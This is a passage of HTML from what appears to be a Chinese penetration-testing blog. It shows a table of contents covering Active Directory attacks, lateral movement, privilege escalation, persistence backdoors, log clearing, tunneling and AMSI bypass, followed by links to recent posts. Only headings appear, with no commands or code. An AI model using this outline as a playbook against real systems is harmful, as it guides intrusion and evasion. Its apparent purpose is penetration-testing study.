class="toc-text">2.mitm6 -i eth0 -d </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-adcs"><span class="toc-number">7.1.3.</span> <span class="toc-text">3.adcs</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0hash%E7%A0%B4%E8%A7%A3"><span class="toc-number">7.2.</span> <span class="toc-text">拿到hash破解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-LM"><span class="toc-number">7.2.0.1.</span> <span class="toc-text">1.LM</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-NTLM"><span class="toc-number">7.2.0.2.</span> <span class="toc-text">2.NTLM</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-NTLMv1"><span class="toc-number">7.2.0.3.</span> <span class="toc-text">3.NTLMv1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-NTLMv2"><span class="toc-number">7.2.0.4.</span> <span class="toc-text">4.NTLMv2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-Kerberos-5-TGS"><span class="toc-number">7.2.0.5.</span> <span class="toc-text">5.Kerberos 5 TGS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-Kerberos-ASREP"><span class="toc-number">7.2.0.6.</span> <span class="toc-text">6.Kerberos ASREP</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#9-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">8.</span> <span class="toc-text">9.横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-PTH"><span class="toc-number">8.1.</span> <span class="toc-text">1.PTH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-PTK"><span class="toc-number">8.2.</span> <span class="toc-text">2.PTK</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">8.3.</span> <span class="toc-text">3.非约束委派</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%A5%A8%E6%8D%AE"><span class="toc-number">8.3.1.</span> <span class="toc-text">获取票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E4%B8%BB%E6%9C%BA"><span class="toc-number">8.3.2.</span> <span class="toc-text">查找非约束委派主机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">8.4.</span> <span class="toc-text">4.约束委派</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%A5%A8%E6%8D%AE-1"><span class="toc-number">8.4.1.</span> <span class="toc-text">获取票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E4%B8%BB%E6%9C%BA"><span class="toc-number">8.4.2.</span> <span class="toc-text">查找约束委派主机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">8.5.</span> <span class="toc-text">5.基于资源的约束委派</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-dcsync"><span class="toc-number">8.6.</span> <span class="toc-text">6.dcsync</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-%E6%89%93%E5%8D%B0%E6%9C%BA-SpoolService-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">8.7.</span> <span class="toc-text">7.打印机 SpoolService 漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-AD%E5%9F%9FACL%E6%94%BB%E5%87%BB-aclpwn-py"><span class="toc-number">8.8.</span> <span class="toc-text">8.AD域ACL攻击(aclpwn.py)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-%E8%8E%B7%E5%8F%96LAPS%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81"><span class="toc-number">8.9.</span> <span class="toc-text">9.获取LAPS管理员密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-privexchange%E6%BC%8F%E6%B4%9E"><span class="toc-number">8.10.</span> <span class="toc-text">10.privexchange漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Exchange%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">8.10.0.0.1.</span> <span class="toc-text">Exchange的利用</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-IPC"><span class="toc-number">8.11.</span> <span class="toc-text">11.IPC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-%E5%85%B6%E4%BB%96%E6%A8%AA%E7%A7%BB"><span class="toc-number">8.12.</span> <span class="toc-text">12.其他横移</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#10-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">9.</span> <span class="toc-text">10.权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90"><span class="toc-number">9.1.</span> <span class="toc-text">拿到域控权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E5%90%8E%E9%97%A8"><span class="toc-number">9.2.</span> <span class="toc-text">Windows后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E5%90%8E%E9%97%A8"><span class="toc-number">9.3.</span> <span class="toc-text">Linux后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB"><span class="toc-number">9.4.</span> <span class="toc-text">域信任关系</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E6%94%BB%E5%87%BB%E7%88%B6%E5%9F%9F-SID-History%E7%89%88%E8%B7%A8%E5%9F%9F%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">9.4.1.</span> <span class="toc-text">子域攻击父域 - SID History版跨域黄金票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%AF%86%E9%92%A5%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E5%9F%9F%E7%9A%84%E6%9D%83%E9%99%90-%E4%BF%A1%E4%BB%BB%E7%A5%A8%E6%8D%AE"><span class="toc-number">9.4.2.</span> <span class="toc-text">利用域信任密钥获取目标域的权限 - 信任票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%85%B6%E5%AE%83%E6%9E%97"><span class="toc-number">9.4.3.</span> <span class="toc-text">攻击其它林</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E6%8C%81%E4%B9%85%E6%80%A7%E6%8A%80%E5%B7%A7"><span class="toc-number">9.5.</span> <span class="toc-text">活动目录持久性技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Security-Support-Provider"><span class="toc-number">9.5.0.0.1.</span> <span class="toc-text">Security Support Provider</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SID-History"><span class="toc-number">9.5.0.0.2.</span> <span class="toc-text">SID History</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#AdminSDHolder%EF%BC%86SDProp"><span class="toc-number">9.5.0.0.3.</span> <span class="toc-text">AdminSDHolder＆SDProp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Dcsync%E5%90%8E%E9%97%A8"><span class="toc-number">9.5.0.0.4.</span> <span class="toc-text">Dcsync后门</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5"><span class="toc-number">9.5.0.0.5.</span> <span class="toc-text">组策略</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Hook-PasswordChangeNotify"><span class="toc-number">9.5.0.0.6.</span> <span class="toc-text">Hook PasswordChangeNotify</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Kerberoasting%E5%90%8E%E9%97%A8"><span class="toc-number">9.5.0.0.7.</span> <span class="toc-text">Kerberoasting后门</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#AdminSDHolder"><span class="toc-number">9.5.0.0.8.</span> <span class="toc-text">AdminSDHolder</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Delegation"><span class="toc-number">9.5.0.0.9.</span> <span class="toc-text">Delegation</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#11-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="toc-number">10.</span> <span class="toc-text">11.敏感文件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#windows"><span class="toc-number">10.1.</span> <span class="toc-text">windows</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-1"><span class="toc-number">10.2.</span> <span class="toc-text">Linux</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#12-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">11.</span> <span class="toc-text">12.权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-1"><span class="toc-number">11.1.</span> <span class="toc-text">Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass-UAC"><span class="toc-number">11.1.1.</span> <span class="toc-text">bypass UAC</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">11.1.1.0.1.</span> <span class="toc-text">常用方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">11.1.1.0.2.</span> <span class="toc-text">常用工具</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E6%9D%83-1"><span class="toc-number">11.1.1.1.</span> <span class="toc-text">提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-2"><span class="toc-number">11.2.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83"><span class="toc-number">11.2.0.1.</span> <span class="toc-text">内核溢出提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">11.2.0.2.</span> <span class="toc-text">计划任务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SUID"><span class="toc-number">11.2.0.3.</span> <span class="toc-text">SUID</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">11.2.0.4.</span> <span class="toc-text">环境变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E7%9A%84%E9%94%99%E8%AF%AF%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">11.2.0.5.</span> <span class="toc-text">系统服务的错误权限配置漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2021-4034"><span class="toc-number">11.2.0.6.</span> <span class="toc-text">CVE-2021-4034</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6-%E6%96%87%E4%BB%B6%E5%A4%B9%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE"><span class="toc-number">11.2.0.7.</span> <span class="toc-text">不安全的文件&#x2F;文件夹权限配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BE%E5%AD%98%E5%82%A8%E7%9A%84%E6%98%8E%E6%96%87%E7%94%A8%E6%88%B7%E5%90%8D%EF%BC%8C%E5%AF%86%E7%A0%81"><span class="toc-number">11.2.0.8.</span> <span class="toc-text">找存储的明文用户名，密码</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#13-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">12.</span> <span class="toc-text">13.权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-2"><span class="toc-number">12.1.</span> <span class="toc-text">Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81%E5%AF%86%E7%A0%81%E8%AE%B0%E5%BD%95%E5%B7%A5%E5%85%B7"><span class="toc-number">12.1.0.0.1.</span> <span class="toc-text">1、密码记录工具</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%E3%80%81%E5%B8%B8%E7%94%A8%E7%9A%84%E5%AD%98%E5%82%A8Payload%E4%BD%8D%E7%BD%AE"><span class="toc-number">12.1.0.0.2.</span> <span class="toc-text">2、常用的存储Payload位置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%E3%80%81Run-RunOnce-Keys"><span class="toc-number">12.1.0.0.3.</span> <span class="toc-text">3、Run&#x2F;RunOnce Keys</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4%E3%80%81BootExecute-Key"><span class="toc-number">12.1.0.0.4.</span> <span class="toc-text">4、BootExecute Key</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5%E3%80%81Userinit-Key"><span class="toc-number">12.1.0.0.5.</span> <span class="toc-text">5、Userinit Key</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6%E3%80%81Startup-Keys"><span class="toc-number">12.1.0.0.6.</span> <span class="toc-text">6、Startup Keys</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7%E3%80%81Services"><span class="toc-number">12.1.0.0.7.</span> <span class="toc-text">7、Services</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#8%E3%80%81Browser-Helper-Objects"><span class="toc-number">12.1.0.0.8.</span> <span class="toc-text">8、Browser Helper Objects</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#9%E3%80%81AppInit-DLLs"><span class="toc-number">12.1.0.0.9.</span> <span class="toc-text">9、AppInit_DLLs</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#10%E3%80%81%E6%96%87%E4%BB%B6%E5%85%B3%E8%81%94"><span class="toc-number">12.1.0.0.10.</span> <span class="toc-text">10、文件关联</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#11%E3%80%81bitsadmin"><span class="toc-number">12.1.0.0.11.</span> <span class="toc-text">11、bitsadmin</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#12%E3%80%81mof"><span class="toc-number">12.1.0.0.12.</span> <span class="toc-text">12、mof</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#13%E3%80%81wmi"><span class="toc-number">12.1.0.0.13.</span> <span class="toc-text">13、wmi</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#14%E3%80%81Userland-Persistence-With-Scheduled-Tasks"><span class="toc-number">12.1.0.0.14.</span> <span class="toc-text">14、Userland Persistence With Scheduled Tasks</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#15%E3%80%81Netsh"><span class="toc-number">12.1.0.0.15.</span> <span class="toc-text">15、Netsh</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#16%E3%80%81Shim"><span class="toc-number">12.1.0.0.16.</span> <span class="toc-text">16、Shim</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#17%E3%80%81DLL%E5%8A%AB%E6%8C%81"><span class="toc-number">12.1.0.0.17.</span> <span class="toc-text">17、DLL劫持</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#18%E3%80%81DoubleAgent"><span class="toc-number">12.1.0.0.18.</span> <span class="toc-text">18、DoubleAgent</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#19%E3%80%81waitfor-exe"><span class="toc-number">12.1.0.0.19.</span> <span class="toc-text">19、waitfor.exe</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#20%E3%80%81AppDomainManager"><span class="toc-number">12.1.0.0.20.</span> <span class="toc-text">20、AppDomainManager</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#21%E3%80%81Office"><span class="toc-number">12.1.0.0.21.</span> <span class="toc-text">21、Office</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#22%E3%80%81CLR"><span class="toc-number">12.1.0.0.22.</span> <span class="toc-text">22、CLR</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#23%E3%80%81msdtc"><span class="toc-number">12.1.0.0.23.</span> <span class="toc-text">23、msdtc</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#24%E3%80%81Hijack-CAccPropServicesClass-and-MMDeviceEnumerato"><span class="toc-number">12.1.0.0.24.</span> <span class="toc-text">24、Hijack CAccPropServicesClass and MMDeviceEnumerato</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#25%E3%80%81Hijack-explorer-exe"><span class="toc-number">12.1.0.0.25.</span> <span class="toc-text">25、Hijack explorer.exe</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#26%E3%80%81Windows-FAX-DLL-Injection"><span class="toc-number">12.1.0.0.26.</span> <span class="toc-text">26、Windows FAX DLL Injection</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#27%E3%80%81%E7%89%B9%E6%AE%8A%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%94%AE%E5%80%BC"><span class="toc-number">12.1.0.0.27.</span> <span class="toc-text">27、特殊注册表键值</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#28%E3%80%81%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E5%90%8E%E9%97%A8"><span class="toc-number">12.1.0.0.28.</span> <span class="toc-text">28、快捷方式后门</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#29%E3%80%81Logon-Scripts"><span class="toc-number">12.1.0.0.29.</span> <span class="toc-text">29、Logon Scripts</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#30%E3%80%81Password-Filter-DLL"><span class="toc-number">12.1.0.0.30.</span> <span class="toc-text">30、Password Filter DLL</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#31%E3%80%81%E5%88%A9%E7%94%A8BHO%E5%AE%9E%E7%8E%B0IE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81"><span class="toc-number">12.1.0.0.31.</span> <span class="toc-text">31、利用BHO实现IE浏览器劫持</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-3"><span class="toc-number">12.2.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#crontab"><span class="toc-number">12.2.0.0.1.</span> <span class="toc-text">crontab</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A1%AC%E9%93%BE%E6%8E%A5sshd"><span class="toc-number">12.2.0.0.2.</span> <span class="toc-text">硬链接sshd</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SSH-Server-wrapper"><span class="toc-number">12.2.0.0.3.</span> <span class="toc-text">SSH Server wrapper</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SSH-keylogger"><span class="toc-number">12.2.0.0.4.</span> <span class="toc-text">SSH keylogger</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Cymothoa-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5backdoor"><span class="toc-number">12.2.0.0.5.</span> <span class="toc-text">Cymothoa_进程注入backdoor</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#rootkit"><span class="toc-number">12.2.0.0.6.</span> <span class="toc-text">rootkit</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Tools"><span class="toc-number">12.2.0.0.7.</span> <span class="toc-text">Tools</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#14-%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="toc-number">13.</span> <span class="toc-text">14.痕迹清理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4"><span class="toc-number">13.0.1.</span> <span class="toc-text">Windows日志清除</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%B4%E5%9D%8FWindows%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E5%8A%9F%E8%83%BD"><span class="toc-number">13.0.2.</span> <span class="toc-text">破坏Windows日志记录功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Metasploit"><span class="toc-number">13.0.3.</span> <span class="toc-text">Metasploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3389%E7%99%BB%E9%99%86%E8%AE%B0%E5%BD%95%E6%B8%85%E9%99%A4"><span class="toc-number">13.0.4.</span> <span class="toc-text">3389登陆记录清除</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#15-%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">14.</span> <span class="toc-text">15.内网穿透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-%E5%9C%BA%E6%99%AF%E4%B8%8E%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90"><span class="toc-number">14.0.0.1.</span> <span class="toc-text">0x01 场景与思路分析</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF%E4%B8%80%EF%BC%9A%E5%86%85%E7%BD%91%E9%98%B2%E7%81%AB%E5%A2%99%E5%AF%B9%E5%87%BA%E5%8F%A3%E6%B5%81%E9%87%8F%E6%B2%A1%E6%9C%89%E4%BB%BB%E4%BD%95%E7%AB%AF%E5%8F%A3%E9%99%90%E5%88%B6"><span class="toc-number">14.0.0.1.0.1.</span> <span class="toc-text">场景一：内网防火墙对出口流量没有任何端口限制</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF%E4%BA%8C%EF%BC%9A%E5%86%85%E7%BD%91%E9%98%B2%E7%81%AB%E5%A2%99%E4%BB%85%E5%85%81%E8%AE%B8%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E8%AE%BF%E9%97%AE%E5%A4%96%E7%BD%91%E7%9A%84%E7%89%B9%E5%AE%9A%E7%AB%AF%E5%8F%A3%EF%BC%88%E5%A6%82%EF%BC%9A80-443%EF%BC%89"><span class="toc-number">14.0.0.1.0.2.</span> <span class="toc-text">场景二：内网防火墙仅允许内网主机访问外网的特定端口（如：80, 443）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF%E4%B8%89%EF%BC%9ATCP%E4%B8%8D%E5%87%BA%E7%BD%91-HTTP%E4%BB%A3%E7%90%86"><span class="toc-number">14.0.0.1.0.3.</span> <span class="toc-text">场景三：TCP不出网-HTTP代理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF%E5%9B%9B-TCP%E5%87%BA%E7%BD%91-socks%E4%BB%A3%E7%90%86"><span class="toc-number">14.0.0.1.0.4.</span> <span class="toc-text">场景四    TCP出网-socks代理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-Lcx"><span class="toc-number">14.0.0.2.</span> <span class="toc-text">0x02 Lcx</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">14.0.0.2.1.</span> <span class="toc-text">端口转发</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84"><span class="toc-number">14.0.0.2.2.</span> <span class="toc-text">端口映射</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-SSH%E9%9A%A7%E9%81%93"><span class="toc-number">14.0.0.3.</span> <span class="toc-text">0x03  SSH隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SSH%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%8F%91"><span class="toc-number">14.0.0.3.1.</span> <span class="toc-text">SSH本地转发</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SSH%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%8F%91"><span class="toc-number">14.0.0.3.2.</span> <span class="toc-text">SSH远程转发</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SSH%E5%8A%A8%E6%80%81%E8%BD%AC%E5%8F%91-%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E5%81%9A%E5%8A%A8%E6%80%81%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">14.0.0.3.3.</span> <span class="toc-text">SSH动态转发,正向代理做动态的端口转发</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SSH%E5%8A%A8%E6%80%81%E8%BD%AC%E5%8F%91%EF%BC%8C%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E8%BF%9B%E8%A1%8C%E5%8D%95%E4%B8%80%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">14.0.0.3.4.</span> <span class="toc-text">SSH动态转发，正向代理进行单一的端口转发</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#16-Bypass-AMSI"><span class="toc-number">15.</span> <span class="toc-text">16.Bypass AMSI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E9%94%AE%E5%85%B3%E9%97%ADAMSI"><span class="toc-number">15.0.1.</span> <span class="toc-text">一键关闭AMSI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell%E9%99%8D%E7%BA%A7"><span class="toc-number">15.0.2.</span> <span class="toc-text">powershell降级</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E8%A1%A5%E4%B8%81"><span class="toc-number">15.0.3.</span> <span class="toc-text">内存补丁</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/04/06/%E6%9A%97%E6%9C%88atk123%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/" title="暗月atk123靶场渗透"><img src="https://s2.loli.net/2022/04/05/cHoiWpBKzhurAtw.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="暗月atk123靶场渗透"/></a><div class="content"><a class="title" href="/2022/04/06/%E6%9A%97%E6%9C%88atk123%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/" title="暗月atk123靶场渗透">暗月atk123靶场渗透</a><time datetime="2022-04-06T10:47:12.000Z" title="发表于 2022-04-06 18:47:12">2022-04-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/30/%E3%80%90CVE-2022-26271%E3%80%9174cmsSEv3-4-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" title="【CVE-2022-26271】74cmsSEv3.4.1 任意文件读取漏洞"><img src="https://s2.loli.net/2022/03/30/GRSgAxHcqhEbayM.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【CVE-2022-26271】74cmsSEv3.4.1 任意文件读取漏洞"/></a><div class="content"><a class="title" href="/2022/03/30/%E3%80%90CVE-2022-26271%E3%80%9174cmsSEv3-4-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" title="【CVE-2022-26271】74cmsSEv3.4.1 任意文件读取漏洞">【CVE-2022-26271】74cmsSEv3.4.1 任意文件读取漏洞</a><time datetime="2022-03-30T07:13:17.000Z" title="发表于 2022-03-30 15:13:17">2022-03-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/30/%E3%80%90cve-2022-22947%E3%80%91Spring-Cloud-Gateway-rce/" title="【CVE-2022-22947】Spring Cloud Gateway rce"><img src="https://s2.loli.net/2022/03/30/gp9XMa1bIePCE6S.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【CVE-2022-22947】Spring Cloud Gateway 